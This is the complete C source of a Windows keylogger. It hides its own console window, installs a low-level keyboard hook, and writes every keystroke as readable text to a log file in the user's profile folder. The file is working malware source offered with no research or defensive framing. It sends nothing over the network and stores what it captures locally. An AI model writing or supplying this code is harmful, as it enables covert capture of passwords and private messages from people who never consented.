#include <windows.h>
#include <shlobj.h>
#include <stdio.h>

HHOOK hHook;
char logPath[MAX_PATH]; // Global path to store log file

// Map virtual key codes to readable strings
const char* KeyToString(DWORD vkCode) {
    switch (vkCode) {
        case VK_RETURN: return "[ENTER]";
        case VK_SPACE: return "[SPACE]";
        case VK_TAB: return "[TAB]";
        case VK_BACK: return "[BACKSPACE]";
        case VK_SHIFT:
        case VK_LSHIFT:
        case VK_RSHIFT: return "[SHIFT]";
        case VK_CONTROL:
        case VK_LCONTROL:
        case VK_RCONTROL: return "[CTRL]";
        case VK_MENU:
        case VK_LMENU:
        case VK_RMENU: return "[ALT]";
        case VK_CAPITAL: return "[CAPSLOCK]";
        case VK_ESCAPE: return "[ESC]";
        case VK_LEFT: return "[LEFT]";
        case VK_UP: return "[UP]";
        case VK_RIGHT: return "[RIGHT]";
        case VK_DOWN: return "[DOWN]";
        case VK_DELETE: return "[DEL]";
        case VK_INSERT: return "[INS]";
        case VK_HOME: return "[HOME]";
        case VK_END: return "[END]";
        case VK_PRIOR: return "[PGUP]";
        case VK_NEXT: return "[PGDN]";
        case VK_F1: return "[F1]";
        case VK_F2: return "[F2]";
        case VK_F3: return "[F3]";
        case VK_F4: return "[F4]";
        case VK_F5: return "[F5]";
        case VK_F6: return "[F6]";
        case VK_F7: return "[F7]";
        case VK_F8: return "[F8]";
        case VK_F9: return "[F9]";
        case VK_F10: return "[F10]";
        case VK_F11: return "[F11]";
        case VK_F12: return "[F12]";
        default: {
            static char buf[2] = {0};
            if (vkCode >= 32 && vkCode <= 126) {
                buf[0] = (char)vkCode;
                return buf;
            }
            return "[UNK]";
        }
    }
}

// Log keystrokes to C:\Users\<user>\log.txt
void LogKeystroke(DWORD vkCode) {
    FILE* file = fopen(logPath, "a+");
    if (file) {
        fprintf(file, "%s", KeyToString(vkCode));
        fclose(file);
    }
}

// Hook callback
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lParam;
        LogKeystroke(kb->vkCode);
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

// Entry point
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Hide the console window
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    // Get path to C:\Users\<username>
    if (SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, logPath) != S_OK) {
        MessageBox(NULL, "Failed to get user directory!", "Error", MB_ICONERROR);
        return 1;
    }
    strcat(logPath, "\\log.txt");

    // Install the keyboard hook
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (hHook == NULL) {
        MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
        return 1;
    }

    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);
    return 0;
}
